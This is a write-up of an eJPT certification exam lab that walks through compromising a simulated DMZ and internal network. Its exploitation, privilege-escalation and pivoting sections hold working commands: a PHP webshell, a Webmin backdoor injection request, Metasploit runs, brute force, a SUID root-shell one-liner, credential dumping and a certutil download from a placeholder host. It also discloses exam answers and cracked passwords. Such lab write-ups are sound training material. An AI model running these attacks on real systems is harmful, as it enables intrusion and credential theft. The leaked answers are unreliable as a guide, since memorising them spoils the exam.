# eJPT Exam Writeup

### eLearnSecurity Junior Penetration Tester (eJPT) — Exam Lab | INE/eLearnSecurity | November 2026

---

## Table of Contents

1. [Introduction](#introduction)
2. [Lab Environment](#lab-environment)
3. [Reconnaissance](#reconnaissance)
4. [Enumeration](#enumeration)
5. [Exploitation](#exploitation)
6. [Privilege Escalation](#privilege-escalation)
7. [Post Exploitation](#post-exploitation)
8. [Pivoting](#pivoting)
9. [Windows Exploitation](#windows-exploitation)
10. [Key Findings](#key-findings)
11. [Tools Used](#tools-used)
12. [Lessons Learned](#lessons-learned)

---

## Introduction

The eJPT (eLearnSecurity Junior Penetration Tester) is a fully hands-on, entry-level penetration testing certification offered by INE/eLearnSecurity. Unlike theory-based certifications, the eJPT requires candidates to actively compromise a realistic enterprise lab network and answer 45 questions based on their findings within a 48-hour window.

Every answer must be obtained through actual enumeration, exploitation, and post-exploitation techniques. This writeup documents a complete exam run against an INE-style lab ("Syntex Dynamics" scenario) — from black-box discovery to full internal-network compromise — completed with a **91% score**.

**Rules of engagement (from the Letter of Engagement):** black-box test; scope = the DMZ network plus any internal network reachable from it; any attack, tool, or technique allowed; Metasploit and note-taking permitted; the exam is *not* a CTF — it rewards methodology.

---

## Lab Environment

The network simulated a realistic corporate environment with two segments:

| Network | Range | Description |
| --- | --- | --- |
| DMZ | 192.168.100.0/24 | Public-facing servers and web applications |
| Internal | 192.168.0.0/24 | Dev/staging network, reachable only via pivot |

**Attack Machine:** Kali Linux (192.168.100.5), in-browser via Apache Guacamole (RDP), **not** internet-connected.

### Target inventory

| IP | Hostname / Role | OS | Key services |
| --- | --- | --- | --- |
| 192.168.100.50 | WINSERVER-01 | Windows Server 2012 R2 | WampServer (Apache 2.4.51 / PHP 7.4.26), WordPress 5.9.3, SMB, RDP, MariaDB:3307, WinRM |
| 192.168.100.51 | WINSERVER-02 | Windows Server 2012 R2 | IIS 8.5 + WebDAV, Microsoft FTP (anonymous), SMB, RDP, WinRM |
| 192.168.100.52 | WEBSERVER-02 | Ubuntu 20.04 | Apache (Drupal 7.57), OpenSMTPD :25, Samba, vsftpd (anonymous), MariaDB:3306, SSH |
| 192.168.100.55 | WINSERVER-03 | Windows Server 2019 | IIS 10, SMB, RDP, WinRM — **dual-homed (pivot)** |
| 192.168.100.63 | EC2AMAZ-IK4QFED | Windows Server 2016 | RDP only (all other ports filtered, ICMP blocked) |
| 192.168.100.67 | — | Ubuntu 20.04 | OpenSSH 8.2p1 only (publickey-only) |
| 192.168.0.51 | — (internal) | Ubuntu 20.04 | Apache 2.4.41, **Webmin 1.920 :10000**, SSH, xrdp |
| 192.168.0.57 | — (internal) | Ubuntu 20.04 | OpenSSH 8.2p1 only |

---

## Reconnaissance

### Step 1 — Host Discovery

ARP-based discovery via Nmap (critical: pure ICMP tools miss hardened hosts):

```bash
nmap -sn 192.168.100.5/24
```

**Result:** 6 targets (.50, .51, .52, .55, .63, .67), excluding the gateway (.1) and our own Kali (.5).

> **Lesson:** `fping` (ICMP echo) missed **.63** entirely — its firewall drops echo requests. `nmap -sn` on a local subnet uses ARP, which a host cannot refuse. Always cross-check discovery methods.

### Step 2 — Full TCP Port Scans

```bash
nmap -Pn -sS -sV -sC -p- -T4 --open -oA nmap_dmz_full <targets>
```

Full 65,535-port scans per host, output saved with `-oA`. This surfaced ports the default-1000 scan missed — e.g. MariaDB on **3307** (.50) and WinRM on **5985** — and provided exact counts needed for exam questions (WINSERVER-02: **14** open TCP ports; WINSERVER-03: **15**).

---

## Enumeration

### WINSERVER-01 (.50) — Web stack mapping

```bash
dirb http://192.168.100.50 /usr/share/wordlists/dirb/common.txt
```

Discovered `/wordpress/` and `/phpmyadmin/`. The WordPress HTML referenced a canonical hostname `wordpress.local` — name-based virtual hosting. Without touching DNS, all further requests used:

```bash
curl -H "Host: wordpress.local" http://192.168.100.50/
```

The pretty-permalink REST routes (`/wp-json/...`) returned HTTP 500, but the **query-string route worked**:

```bash
curl -s -H "Host: wordpress.local" "http://192.168.100.50/?rest_route=/wp/v2/users"
# → [{"id":1,"name":"admin","slug":"admin", ...}]
```

Unauthenticated user enumeration → username `admin`. The theme stylesheet disclosed **Spintech**; WPScan (aggressive) fingerprinted **WordPress 5.9.3** and **3 plugins**: burger-companion, wp-responsive-thumbnail-slider (v1.0), wp-file-manager.

### WINSERVER-02 (.51) — Anonymous FTP

```bash
curl -s -l ftp://anonymous:anonymous@192.168.100.51/
# aspnet_client/  cmdasp.aspx  iis-85.png  iisstart.htm  robots.txt.txt
```

`robots.txt.txt` contained `Disallow: /cmdasp.aspx` — a breadcrumb pointing at a pre-placed ASP.NET webshell, whose full source was readable over anonymous FTP (`cmd.exe /c` on a form field, no auth check).

### WEBSERVER-02 (.52) — Drupal host

Anonymous vsftpd (`updates.txt`), OpenSMTPD on :25, Samba, and Apache serving `/drupal/`. The Drupal version came from the standard fingerprint file:

```bash
curl -s http://192.168.100.52/drupal/CHANGELOG.txt | head
# Drupal 7.57
```

Drupal 7.57 → vulnerable to **Drupalgeddon2 (CVE-2018-7600, CVSS v3: 9.8)**.

### WINSERVER-03 (.55)

IIS 10.0 (→ Server 2019), SMB with signing not required, SMBv1 enabled. Anonymous SMB/RPC denied → credential attack surface.

---

## Exploitation

### 1. WordPress → XML-RPC brute force (WINSERVER-01)

```bash
wpscan --url http://192.168.100.50 --http-server-name wordpress.local \
       --usernames admin --passwords /usr/share/wordlists/rockyou.txt
# [SUCCESS] - admin / estrella
```

### 2. Authenticated arbitrary file upload → SYSTEM (WINSERVER-01)

WP Responsive Thumbnail Slider **v1.0** has an authenticated arbitrary-upload flaw (Exploit-DB `php/webapps/37998.txt`; MSF `php/remote/45099.rb`). Using the admin credentials: the plugin's "Add New" image form was submitted with the filename swapped from `.php.jpg` to `.php`; the payload landed at `/wp-content/uploads/wp-responsive-images-thumbnail-slider/<md5>.php` and executed on GET:

```php
<?php system($_GET['cmd']); ?>
```

```bash
curl -s -H "Host: wordpress.local" \
  "http://192.168.100.50/wp-content/uploads/wp-responsive-images-thumbnail-slider/<md5>.php?cmd=whoami"
# nt authority\system
```

**Unauthenticated-to-SYSTEM chain:** REST user enum → XML-RPC password attack → plugin upload → RCE as SYSTEM.

### 3. Pre-placed webshell → SYSTEM (WINSERVER-02)

`/cmdasp.aspx` rendered without authentication. Replaying the ASP.NET hidden fields (`__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION`) with `txtArg=whoami` returned **`nt authority\system`** — unauthenticated OS command execution, sourced directly from the anonymous FTP disclosure.

### 4. Drupalgeddon2 → Meterpreter (WEBSERVER-02)

```javascript
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.100.52
set TARGETURI /drupal/          # critical: Drupal is NOT at webroot
check                            # [+] The target is vulnerable
exploit                          # Meterpreter session as www-data
```

### 5. SMB password attack (WINSERVER-03)

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt -t 1 -f smb://192.168.100.55
# [445][smb] host: 192.168.100.55  login: Administrator  password: swordfish   (18 seconds)
```

Verified with CrackMapExec → `Pwn3d!` (local admin confirmed).

### 6. OpenSMTPD command injection (WEBSERVER-02)

Post-exploitation on .52 revealed Docker bridge `br-9e725181656f` (172.21.0.0/16) hosting container `cve-2020-7247_smtpd_1`, published as `0.0.0.0:25→25`. **CVE-2020-7247**: the `MAIL FROM` local part reaches a shell unsanitized → remote command injection (Metasploit: `exploit/unix/smtp/opensmtpd_mail_from_rce`). The full SMTP injection dialogue was accepted by the target (`250 Message accepted for delivery`).

### 7. Webmin 1.920 backdoor (internal .51)

The internal web host exposed **Webmin 1.920** on TCP 10000 — inside the CVE-2019-15107 backdoor range. Manual probe (note the mandatory Referer header):

```bash
curl -s -X POST http://192.168.0.51:10000/password_change.cgi \
  -H "Referer: http://192.168.0.51:10000/password_change.cgi" \
  --data "user=root&pam=&expired=2&old=test123|id&new1=x&new2=x"
```

Exploited through the pivot via Metasploit (see [Pivoting](#pivoting)) → **root** shell on the internal host.

---

## Privilege Escalation

### Linux — SUID `find` (WEBSERVER-02)

The Drupalgeddon2 session ran as low-privileged `www-data`. SUID enumeration:

```bash
find /usr/bin /usr/sbin /bin /sbin -type f -perm -4000
# /usr/bin/find  →  -rwsr-sr-x 1 root root
```

`/usr/bin/find` was **SUID+SGID root** (GTFOBins class). Verified effective root:

```bash
/usr/bin/find /tmp -maxdepth 0 -exec /usr/bin/id \;
# uid=33(www-data) euid=0(root) egid=0(root)
```

Full root shell (real UID 0, needed because some tools read the *real* UID):

```bash
/usr/bin/find /tmp -maxdepth 0 -exec /usr/bin/python3 -c \
  'import os; os.setuid(0); os.system("/bin/sh")' \;
```

### Windows — Credential attacks as privesc

On WINSERVER-03, privilege escalation *was* the SMB brute force (`Administrator:swordfish`). On WINSERVER-01/02 the web exploits landed directly as `NT AUTHORITY\SYSTEM`, so no escalation was needed — a reminder that on Windows, web service context is often already game over.

---

## Post Exploitation

### Loot: credentials and hashes

| Source | Technique | Result |
| --- | --- | --- |
| WINSERVER-03 SAM | `crackmapexec smb ... --sam` + John (`--format=NT`, rockyou) | mary = `hotmama`, lawrence = `computadora`, admin = `blanca` |
| WINSERVER-01 SAM | hash extraction via SYSTEM PHP shell + John | mike = `diamond` |
| Drupal `settings.php` | Meterpreter `cat` as www-data | DB `drupal:syntex0421` |
| MariaDB `mysql.user` | hash correlation | root hash == drupal hash → **MySQL root = `syntex0421`** (confirmed by remote root login) |

> **Lesson — hash correlation:** `root@localhost` used `unix_socket` auth (login rejected with ERROR 1698), but the *legacy password hash* in `mysql.user` was identical for root and the drupal app account. Same hash = same password → remote `root@%` login with `syntex0421` succeeded.

### Loot: flags and answers

- `/home/auditor/flag.txt` on the Drupal host — dynamic flag, readable after identifying permissions.
- `C:\Users\Administrator\flag.txt` on WINSERVER-03 via `crackmapexec -x "type ..."`.
- `net user` on each Windows host answered the account-inventory questions (WINSERVER-01: 4 accounts excluding Guest; WINSERVER-02: steven; WINSERVER-03: 4 non-default accounts including lawrence and mary).
- `wmic qfe list brief` on WINSERVER-01 → **220** installed hotfixes.

### The Q18 riddle — Samba user enumeration

Anonymous `rpcclient`/`enum4linux` user enum was denied; the Samba passdb (`passdb.tdb`) was root-only, and even root-level `pdbedit -L` / `tdbdump` showed **zero** tdbsam accounts. The breakthrough:

```bash
enum4linux -a 192.168.100.52
# RID cycling against SID S-1-22-1 (Unix User mapping):
# S-1-22-1-1000  Unix User\ubuntu   (Local User)
# S-1-22-1-1001  Unix User\auditor  (Local User)
# S-1-22-1-1002  Unix User\dbadmin  (Local User)
```

**3 users enumerable from Samba** — they were *Unix* users exposed through Samba's SID mapping, invisible to passdb inspection. **Lesson:** for "users enumerable via Samba," RID cycling is authoritative; an empty passdb means nothing.

---

## Pivoting

### Discovery

The pivot was found by the simplest post-exploitation habit — on WINSERVER-03:

```bash
crackmapexec smb 192.168.100.55 -u Administrator -p 'swordfish' --local-auth -x "ipconfig /all"
# Ethernet 3: 192.168.100.55/24 (DMZ)
# Ethernet 4: 192.168.0.50/24   (INTERNAL — gw 192.168.0.1, DNS 192.168.0.2)
```

> **Lesson:** the environment tried to misdirect us — the Drupal host had a live Docker bridge (172.21.0.0/16) that *looked* like the internal network. Interface evidence beat assumption: only WINSERVER-03 was truly dual-homed into the in-scope internal /24.

### Establishing the route

```javascript
use exploit/windows/smb/psexec
set RHOSTS 192.168.100.55 / SMBUser Administrator / SMBPass swordfish
exploit                              # Meterpreter session 1 (SYSTEM)

meterpreter > run autoroute -s 192.168.0.0/24
meterpreter > run autoroute -p       # verify: route via Session 1
```

### Internal discovery through the pivot

From an impacket-psexec shell on the pivot (cmd ping loop — sequential but fast with `-w 200`):

```cmd
for /L %i in (1,1,254) do @ping -n 1 -w 200 192.168.0.%i | find "TTL=" >nul && echo ALIVE 192.168.0.%i
:: ALIVE: .1 (gateway) .50 (pivot) .51 .57  → 2 internal targets
```

Port scanning without nmap — PowerShell TcpClient one-liner from the pivot:

```powershell
foreach($h in '192.168.0.51','192.168.0.57'){foreach($p in 21,22,80,443,445,3389,10000){$t=New-Object Net.Sockets.TcpClient;try{$a=$t.BeginConnect($h,$p,$null,$null);$null=$a.AsyncWaitHandle.WaitOne(300,$false);if($t.Connected){Write-Output "$h port $p OPEN"};$t.Close()}catch{}}}
```

Result: .51 → 22/80/3389 (+**10000**, found by a follow-up high-port sweep), .57 → 22 only. Windows Server 2019's built-in `curl.exe` handled HTTP fingerprinting (`Server: Apache/2.4.41 (Ubuntu)` — completing the cross-network Apache count).

### Exploiting through the route — the bind-payload lesson

```javascript
use exploit/linux/http/webmin_backdoor
set RHOSTS 192.168.0.51
check                                   # [+] The target is vulnerable
exploit                                 # FAILS with reverse payload
```

The reverse payload (`cmd/unix/reverse_perl`, LHOST=Kali) **cannot work**: the internal host has no route back to the DMZ. The fix:

```javascript
set PAYLOAD cmd/unix/bind_perl          # listen on the TARGET; msf connects via the route
exploit
# Command shell session 2 opened (192.168.0.50:56604 -> 192.168.0.51:4444 via session 1)
# whoami → root
```

> **Core pivoting rule:** through an autoroute, Metasploit can only initiate connections *toward* the internal network. Reverse shells from internal hosts have nowhere to go — **use bind payloads**.

---

## Windows Exploitation

| Technique | Where | Detail |
| --- | --- | --- |
| ASP.NET webshell replay | WINSERVER-02 | Source disclosed via anonymous FTP; ViewState/EventValidation replayed for unauth SYSTEM RCE |
| SMB brute force | WINSERVER-03 | Hydra + rockyou → `Administrator:swordfish` (18s — right wordlist = minutes, per the LOE) |
| PSExec (impacket & MSF) | WINSERVER-03 | Writable `ADMIN$` → service-based SYSTEM shell; base for pivot |
| SAM dump + crack | WINSERVER-03, -01 | `cme --sam` / hash extraction → John `--format=NT` + rockyou (mary, lawrence, admin, mike) |
| WinRM probing | .50/.51 | `/wsman` → 405 GET / 401 Negotiate — reachable but credentialed; no bypass |
| WebDAV testing | WINSERVER-02 | `OPTIONS` advertised PUT in `Public` but not `Allow`; actual PUT → **401** (trust tests, not banners) |
| File download LOLBin | (knowledge) | `certutil -urlcache -split -f http://<host>/file C:\path\file` |

---

## Key Findings

| # | Host | Vulnerability | Severity | Impact |
| --- | --- | --- | --- | --- |
| 1 | WINSERVER-01 | WordPress Responsive Thumbnail Slider v1.0 — authenticated arbitrary file upload | High | SYSTEM RCE (credential attack on `admin` supplied auth) |
| 2 | WINSERVER-01 | Weak WordPress admin password (`estrella`) via XML-RPC | High | Full admin compromise |
| 3 | WINSERVER-02 | Anonymous FTP exposing webroot + pre-placed ASP.NET webshell | Critical | Unauthenticated SYSTEM RCE |
| 4 | WEBSERVER-02 | Drupal 7.57 — Drupalgeddon2 (CVE-2018-7600) | Critical (9.8) | Unauthenticated RCE (www-data) |
| 5 | WEBSERVER-02 | SUID root `/usr/bin/find` | High | Local privesc www-data → root |
| 6 | WEBSERVER-02 | Password reuse: MySQL root = application DB password | High | Full database compromise |
| 7 | WEBSERVER-02 | OpenSMTPD container — CVE-2020-7247 command injection | Critical | Containerized RCE as root |
| 8 | WINSERVER-03 | Weak Administrator password (`swordfish`) over SMB | Critical | Full host compromise + **pivot** |
| 9 | Internal .51 | Webmin 1.920 backdoor (CVE-2019-15107) | Critical | Unauthenticated RCE as root (internal network) |
| 10 | All networks | Segmentation failure — DMZ compromise cascaded to internal | High | Total environment compromise |

---

## Tools Used

| Category | Tools |
| --- | --- |
| Discovery/Scanning | Nmap (incl. NSE: smb-*, ftp-anon, rdp-*), fping |
| Web enumeration | dirb, WhatWeb, Nikto, WPScan, curl (incl. Windows curl.exe), gobuster-style wordlists |
| Exploitation | Metasploit (drupalgeddon2, webmin_backdoor, psexec, opensmtpd_mail_from_rce), Searchsploit |
| Brute force | Hydra (SMB/SSH), WPScan XML-RPC |
| Windows post-ex | CrackMapExec, impacket-psexec, wmic, certutil, net user/qfe |
| Password cracking | John the Ripper (NTLM), rockyou.txt |
| Pivoting/enum | Meterpreter autoroute, PowerShell TcpClient, enum4linux (RID cycling) |
| Linux post-ex | Meterpreter, mysql client, GTFOBins (SUID find), docker |

---

## Lessons Learned

1. **Read every question before touching a tool.** The quiz itself maps the network — it tells you what exists and what to look for.
2. **Validate your tools on known-good targets.** The lab's `nc` printed nothing for successful `-z` scans without `-v` — two "empty" scans were silently invalid.
3. **ARP discovery ≠ ICMP discovery.** `fping` missed a whole host; `nmap -sn` didn't.
4. **Reverse payloads die behind pivots.** Internal hosts can't route back to Kali — bind payloads through autoroute are the answer.
5. **Vhosts without DNS:** a `Host:` header is enough. And when pretty REST routes 500, try `?rest_route=`.
6. **Breadcrumbs matter:** `robots.txt(.txt)` pointed at the webshell; the container *name* (`cve-2020-7247_smtpd_1`) announced its own CVE.
7. **Empty databases lie too.** Samba's empty passdb didn't mean "no users" — RID cycling exposed the Unix-mapped accounts.
8. **Hash correlation beats brute force:** identical MySQL hashes proved root's password without cracking anything.
9. **The pivot hides in `ipconfig /all`.** Run it on every compromised Windows host, immediately.
10. **Notes live OFF the exam box.** A lab reset wipes Kali; every finding was mirrored externally.
11. **Time was never the enemy.** Methodical enumeration answered most questions before exploitation even began.

---

*Exam completed November 2026 — Score: 91% (first attempt). Environment: INE eJPT exam lab ("Syntex Dynamics" scenario). All activities performed in an authorized, isolated training environment.*
